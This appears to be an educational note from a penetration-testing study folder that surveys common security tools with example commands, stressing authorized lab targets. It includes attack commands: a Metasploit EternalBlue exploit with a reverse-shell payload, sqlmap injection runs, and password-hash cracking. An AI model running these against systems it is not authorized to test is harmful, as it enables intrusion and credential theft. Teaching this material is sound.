# Common Tools of the Trade

A map of the standard, industry-known tools used across the methodology in this folder — what each one is for, where it fits, and a concrete example of it in use. Knowing the landscape of tool names and purposes is what lets you follow a writeup, a report, or a conversation among practitioners; the examples below are illustrative starting points, not a complete reference for any of these tools.

## Reconnaissance

**theHarvester** — pulls emails, subdomains, and hostnames for a domain from public sources (search engines, certificate transparency logs) in one pass (see [[03-reconnaissance|reconnaissance]]).

```
theHarvester -d example.com -b all
# -d: target domain   -b: which sources to query ("all" = every supported source)
```

**Shodan** — a search engine indexing internet-connected devices and exposed services; used via its website or CLI to see what's publicly reachable without sending a single packet at the target yourself.

```
shodan search "apache" "country:US" "port:8080"
shodan host 93.184.216.34          # look up everything Shodan knows about a specific IP
```

## Scanning & enumeration

**Nmap** — the default first tool for mapping what's reachable and what's running (see [[06-scanning-and-enumeration|scanning-and-enumeration]]).

```
nmap -sV -sC 192.168.1.0/24        # scan a whole subnet: version detection + default scripts
nmap -p 1-65535 -T4 10.0.0.5       # every port, faster timing, on a single host
```

**Nikto** — a web-server scanner for common misconfigurations and outdated software.

```
nikto -h https://192.168.1.10
```

**OpenVAS** — an automated vulnerability scanner comparing discovered services against known-CVE databases; typically driven through its web UI rather than a single CLI invocation, producing a ranked findings report once a scan against a defined target list completes.

## Web application testing

**Burp Suite** — an intercepting proxy: point your browser at Burp's local proxy (commonly `127.0.0.1:8080`), and every request/response passing through it can be viewed, paused, and edited before it reaches the server. A typical workflow: browse the target normally with the proxy intercepting, send an interesting request to **Repeater** to manually tweak and resend it (changing a parameter to test for injection or broken access control, per [[07-exploitation-concepts|exploitation-concepts]]), or send a whole flow to **Intruder** to automate trying many payloads against one parameter.

**OWASP ZAP** — a free, open-source alternative with an "Automated Scan" mode for a quick pass, plus the same manual intercept/repeat workflow as Burp for deeper testing.

**sqlmap** — once a likely SQL injection point is found manually (see [[07-exploitation-concepts|exploitation-concepts]]), sqlmap automates confirming and demonstrating it.

```
sqlmap -u "https://target.com/item?id=1" --dbs        # test the `id` parameter, list databases if injectable
sqlmap -u "https://target.com/item?id=1" -D shop --tables
sqlmap -u "https://target.com/item?id=1" --cookie="session=abc123" --dbs   # authenticated testing
```

## Exploitation frameworks

**Metasploit** — packaged, maintained exploit modules plus payload generation, so a known vulnerability's real impact can be demonstrated without writing exploit code from scratch.

```
msfconsole
search type:exploit ms17-010          # find modules for a known vulnerability
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
run
```

## Network analysis

**Wireshark** — captures and inspects raw traffic in detail, used both offensively (seeing what a target's own traffic reveals) and defensively (a core blue-team tool for incident investigation).

```
# capture filter (what to capture) vs display filter (what to show from a capture) are different syntaxes:
tcpdump -i eth0 port 443 -w capture.pcap     # capture, via the CLI companion tool
```
Inside Wireshark's own display-filter bar: `http.request` (show only HTTP requests), `ip.addr == 192.168.1.20` (show only traffic to/from one host), `tcp.flags.syn == 1 && tcp.flags.ack == 0` (show only TCP SYN packets — the start of new connections).

## Password/credential testing

**Hashcat** — GPU-accelerated password cracking against a captured hash (see [[02-cia-triad|cia-triad]] for why weak hashing makes this feasible at all, and [[10-pdf-and-document-security|pdf-and-document-security]] / [[11-wifi-security-testing|wifi-security-testing]] for two concrete applications of it).

```
hashcat -m 0 -a 0 hashes.txt rockyou.txt          # -m 0: MD5 hash mode, -a 0: straight dictionary attack
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d     # NTLM hashes, mask attack: Upper+4 lower+2 digits
```

**John the Ripper** — a longstanding alternative, particularly common for its format-specific hash-extraction helper scripts.

```
python2 pdf2john.py locked.pdf > hash.txt
john --wordlist=rockyou.txt hash.txt
john --show hash.txt                               # display any passwords already cracked
```

## Operating systems built for this work

**Kali Linux** and **Parrot OS** ship most of the above tools preinstalled and configured — covered in more depth, including the VM/hardware setup considerations, in [[04-lab-setup-and-os-choice|lab-setup-and-os-choice]].

## Why tool names matter less than the underlying concept

Every tool listed here automates a task that maps directly onto a phase already covered in this folder — a scanner maps to [[06-scanning-and-enumeration|scanning-and-enumeration]], an exploitation framework maps to [[07-exploitation-concepts|exploitation-concepts]]. Tools change, get replaced, or get updated; understanding *what task a category of tool exists to do and why* (covered in the rest of this folder) transfers far better long-term than memorizing specific command flags for whatever's currently popular.

## Getting hands-on practice

**HackTheBox**, **TryHackMe**, and similar platforms provide legally sanctioned, intentionally vulnerable systems specifically for practicing these tools end to end (see the practicing-legally section in [[01-rules-of-engagement-and-legal|rules-of-engagement-and-legal]]). Certifications like **OSCP** (heavily hands-on, exam-based) and **CEH** (broader, more conceptual) are common formal ways to structure and validate this skill set — more on the full path in [[14-career-path-and-best-practices|career-path-and-best-practices]].

Before either of those: [[05-home-lab-setup|home-lab-setup]] builds a local, disposable lab (Kali + Metasploitable2 + DVWA), and [[12-practice-exercises|practice-exercises]] gives goal-only tasks to run against it — the actual "use these tools for real" step, rather than reading about them.

## Gotchas

- Every example above assumes a target you own or are explicitly authorized to test (your own lab VM, a HackTheBox machine, your own network) — running any of these against anything else is the exact same legal exposure as any other unauthorized access, regardless of how "just testing" or exploratory the intent feels. See [[01-rules-of-engagement-and-legal|rules-of-engagement-and-legal]].
- Tool proficiency without methodology (see [[02-penetration-testing-methodology|penetration-testing-methodology]]) produces scattered, incomplete testing — the tools support the process, they aren't a substitute for following it.
- Wordlists matter as much as the tool — `rockyou.txt` (a well-known leaked-password wordlist bundled with Kali) is a common default, but a mask attack or a target-specific custom wordlist often outperforms a generic one, as covered in [[10-pdf-and-document-security|pdf-and-document-security]].

## Related
- [[06-scanning-and-enumeration|scanning-and-enumeration]]
- [[07-exploitation-concepts|exploitation-concepts]]
- [[04-lab-setup-and-os-choice|lab-setup-and-os-choice]]
- [[01-rules-of-engagement-and-legal|rules-of-engagement-and-legal]]
